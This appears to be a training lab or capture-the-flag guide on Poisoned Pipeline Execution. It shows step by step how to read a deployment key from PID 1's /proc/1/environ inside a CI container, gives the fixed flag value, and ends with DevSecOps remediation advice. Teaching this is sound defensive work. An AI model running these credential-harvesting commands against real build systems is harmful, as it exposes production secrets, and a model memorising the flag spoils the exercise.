# Challenge 1: Poisoned Pipeline Execution & Secret Harvesting

## 📖 Background & Threat Landscape

In modern cloud-native environments, **Continuous Integration and Continuous Deployment (CI/CD)** pipelines are high-value targets. Under the **Poisoned Pipeline Execution (PPE)** attack pattern (MITRE ATT&CK [T1195.002](https://attack.mitre.org/techniques/T1195/002/)), an attacker submits a malicious Pull Request or alters build scripts (`.gitlab-ci.yml`, `Jenkinsfile`, GitHub Actions workflow) to execute arbitrary commands within the build runner.

A common architectural anti-pattern occurs when orchestrators pass deployment credentials or cloud API keys to the primary runner daemon (PID 1). Developers often assume that running build tasks in subshells or child processes shields these secrets if they are not explicitly exported to child environments. However, under standard Linux container defaults:
- All processes inside the container share the same **PID namespace**.
- The virtual filesystem `/proc` exposes raw process memory and state.
- The pseudo-file `/proc/[PID]/environ` contains the initial environment variables of the target process, separated by null bytes (`\0`).

In this challenge, your objective is to simulate an adversary with code execution inside the build agent container, harvest the production deployment key from PID 1, and save it for verification.

---

## 🛠️ Step-by-Step Instructions

### 1. Access the Vulnerable CI/CD Runner Container

From the host terminal, obtain an interactive shell session inside the target container:

```bash
docker exec -it cicd_runner_pipeline sh
```

You are now operating inside the build worker container as root.

### 2. Verify Subshell Environment Variable Masking

Run standard environment listing utilities to observe what is visible in the current session:

```bash
env
```

Notice that standard variables such as `PATH` and `HOSTNAME` are listed, but **no production deployment keys** appear in your current shell environment.

### 3. Inspect the Process Table

Identify the processes executing inside this container:

```bash
ps aux
```

You will observe:
- **PID 1**: `/app/pipeline_runner.sh` (the parent pipeline daemon)
- **Child PIDs**: Your interactive shell (`sh`) and `ps`.

### 4. Extract Process Memory from `/proc/1/environ`

Because Linux exposes the initial execution environment of PID 1 in `/proc/1/environ`, you can read this virtual file. Since the fields are separated by null bytes (`\0`), use `tr` or `strings` to format the output into readable lines:

Using `tr`:
```bash
tr '\0' '\n' < /proc/1/environ
```

Or using `strings` and filtering for the flag:
```bash
strings /proc/1/environ | grep FLAG
```

Examine the output. You will discover the production deployment secret:
`DEPLOY_PRODUCTION_KEY=FLAG{supply_chain_credential_leaked_proc_2026}`

### 5. Exit the Container and Store the Flag

Exit the container session to return to the host VM prompt:

```bash
exit
```

Now, write the captured flag into `/tmp/flag1.txt` on the host:

```bash
echo "FLAG{supply_chain_credential_leaked_proc_2026}" > /tmp/flag1.txt
```

Verify that the file contains the flag:

```bash
cat /tmp/flag1.txt
```

---

## 🔍 DevSecOps Key Takeaway

> **Why did this happen?**
> Standard Docker containers run with a shared PID namespace. Any process with sufficient privileges (or running as the same UID as PID 1) can read `/proc/1/environ`.
>
> **Production Remediation:**
> - Never inject long-lived static secrets into container process environments.
> - Utilize dynamic, ephemeral credentials via **OIDC (OpenID Connect)** or secret stores with short TTLs (e.g., HashiCorp Vault, AWS Secrets Manager).
> - Enable **User Namespaces** (`userns-remap`) and isolate build jobs in separate microVMs or ephemeral containers (e.g., using Kubernetes Pods per build).

---

## ✅ Verification

Click the **Check** button below or run the verification script directly from your terminal:

```bash
/step1/verify.sh
```
